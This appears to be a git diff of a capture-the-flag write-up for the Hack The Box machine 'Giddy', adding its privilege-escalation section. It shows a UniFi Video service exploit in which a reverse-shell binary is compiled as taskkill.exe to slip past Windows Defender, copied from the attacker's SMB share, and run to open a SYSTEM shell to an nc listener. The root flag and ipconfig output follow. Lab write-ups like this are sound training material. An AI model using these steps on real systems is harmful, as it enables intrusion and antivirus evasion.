@@ -28,7 +28,7 @@ PORT     STATE SERVICE       REASON          VERSION
 
 ```
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>Landing Page. Nothing of Interest.</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption><p>Landing Page. Nothing of Interest.</p></figcaption></figure>
 
 Web Directory Bruteforcing
 
@@ -61,9 +61,9 @@ ________________________________________________
 
 <figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>Some Kind Store Web App</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>Entering an Apostrophe in the Search Field Confirms That It's Vulnerable to SQL Injection </p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>Entering an Apostrophe in the Search Field Confirms That It's Vulnerable to SQL Injection </p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>Confirmed SQL Injection</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption><p>Confirmed SQL Injection</p></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Performing The Injection Using Burp Suite With A Different Payload To Authenticate To A Malicious SMB Service </p></figcaption></figure>
 
@@ -179,3 +179,132 @@ Tunnel adapter isatap..htb:
 <figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption><p>user.txt</p></figcaption></figure>
 
 ## Privilege Escalation
+
+Searching For Installed Software
+
+```
+*Evil-WinRM* PS C:\programdata> cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+...
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Ubiquiti UniFi Video
+...
+```
+
+Searching for **site:exploit-db.com \*Ubiquiti UniFi Video\*** reveals a potential privilege escalation exploit [https://www.exploit-db.com/exploits/43390](https://www.exploit-db.com/exploits/43390)
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation</p></figcaption></figure>
+
+According to the exploit is it required to upload a malicious file called **taskkill.exe** to **C:\ProgramData\unifi-video\\**. I check to see if windows defender is running
+
+```
+*Evil-WinRM* PS C:\users\stacy\desktop> Get-Service windefend
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  windefend          Windows Defender Service
+```
+
+Since windows defender is running, I will be using ParanoidNinja's Prometheus tool [https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) and simply modify the ip and port of your attacking machine. I then proceed to compile.
+
+{% code overflow="wrap" %}
+```
+┌──[Sun Nov  6 12:43:55 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/opt/prometheus]
+└──# i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+```
+{% endcode %}
+
+With an already running malicious smb server running, I proceed to upload the file
+
+{% code overflow="wrap" %}
+```
+*Evil-WinRM* PS C:\Users\Stacy\Documents> net use \\10.10.16.2\winreconpack /user:smbuser smbuser
+The command completed successfully.
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+*Evil-WinRM* PS C:\programdata\unifi-video> copy \\10.10.16.2\winreconpack\taskkill.exe
+```
+{% endcode %}
+
+With the uploaded file I set up a netcat listener on port 443
+
+```
+┌──[Sun Nov  6 12:44:07 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
+└──# nc -lnvp 443                                                                                                                                        130 ⨯
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+```
+
+I now stop and start the service and gain system privileges
+
+```
+*Evil-WinRM* PS C:\programdata\unifi-video> Stop-Service "Ubiquiti UniFi Video"; Start-Service "Ubiquiti UniFi Video"
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+```
+
+```
+┌──[Sun Nov  6 12:44:07 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
+└──# nc -lnvp 443                                                                                                                                        130 ⨯
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.129.96.140.
+Ncat: Connection from 10.129.96.140:49888.
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\ProgramData\unifi-video>
+```
+
+## Root Proof
+
+```
+C:\Users\Administrator\Desktop>hostname && whoami && type root.txt && ipconfig /all
+hostname && whoami && type root.txt && ipconfig /all
+Giddy
+nt authority\system
+3eb60479156649292f1069ddc56d1a57
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : Giddy
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : .htb
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
+   Physical Address. . . . . . . . . : 00-50-56-B9-CA-04
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.129.96.140(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 8:42:12 PM
+   Lease Expires . . . . . . . . . . : Sunday, November 6, 2022 2:42:43 PM
+   Default Gateway . . . . . . . . . : 10.129.0.1
+   DHCP Server . . . . . . . . . . . : 10.129.0.1
+   DNS Servers . . . . . . . . . . . : 1.1.1.1
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter isatap..htb:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : .htb
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+C:\Users\Administrator\Desktop>
+```
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
